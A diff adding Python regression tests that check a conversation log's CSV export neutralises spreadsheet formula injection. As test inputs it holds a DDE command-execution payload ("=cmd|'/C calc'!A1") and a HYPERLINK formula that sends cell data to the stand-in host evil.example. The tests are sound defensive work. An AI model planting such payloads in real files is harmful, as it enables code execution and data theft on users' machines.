@@ -302,6 +302,52 @@ class ToCsvTests(_TmpLogBase):
                          f"Legacy 'user' event should be labeled 'You'; got {rows[0]['speaker']!r}")
 
 
+class CsvFormulaInjectionTests(_TmpLogBase):
+    """Regression: to_csv() wrote conversation text (a user-controlled
+    field) verbatim into CSV cells. Excel/Sheets/LibreOffice treat a cell
+    starting with '=', '+', '-', '@', tab, or CR as a formula to evaluate on
+    open — a logged message like "=cmd|'/C calc'!A1" or "=HYPERLINK(evil)"
+    would execute/exfiltrate the moment the exported CSV is opened in a
+    spreadsheet app. Cells starting with those characters must be prefixed
+    with a single quote to neutralize formula interpretation.
+    """
+
+    def _first_text_cell(self, csv_text):
+        import csv, io
+        rows = list(csv.DictReader(io.StringIO(csv_text)))
+        return rows[0]["text"]
+
+    def test_leading_equals_is_neutralized(self):
+        self.log.log_user_comment("=cmd|'/C calc'!A1")
+        cell = self._first_text_cell(self.log.to_csv())
+        self.assertTrue(cell.startswith("'="), f"got {cell!r}")
+
+    def test_leading_plus_is_neutralized(self):
+        self.log.log_user_comment("+1+1")
+        cell = self._first_text_cell(self.log.to_csv())
+        self.assertTrue(cell.startswith("'+"), f"got {cell!r}")
+
+    def test_leading_at_is_neutralized(self):
+        self.log.log_user_comment("@SUM(1,1)")
+        cell = self._first_text_cell(self.log.to_csv())
+        self.assertTrue(cell.startswith("'@"), f"got {cell!r}")
+
+    def test_leading_hyphen_is_neutralized(self):
+        self.log.log_user_comment("-2+3")
+        cell = self._first_text_cell(self.log.to_csv())
+        self.assertTrue(cell.startswith("'-"), f"got {cell!r}")
+
+    def test_normal_text_is_unmodified(self):
+        self.log.log_user_comment("hello, how are you?")
+        cell = self._first_text_cell(self.log.to_csv())
+        self.assertEqual(cell, "hello, how are you?")
+
+    def test_hyperlink_formula_is_neutralized(self):
+        self.log.log_user_comment('=HYPERLINK("http://evil.example/?"&A1,"click")')
+        cell = self._first_text_cell(self.log.to_csv())
+        self.assertTrue(cell.startswith("'="), f"got {cell!r}")
+
+
 class SingletonTests(unittest.TestCase):
     def tearDown(self):
         reset_conversation_log()
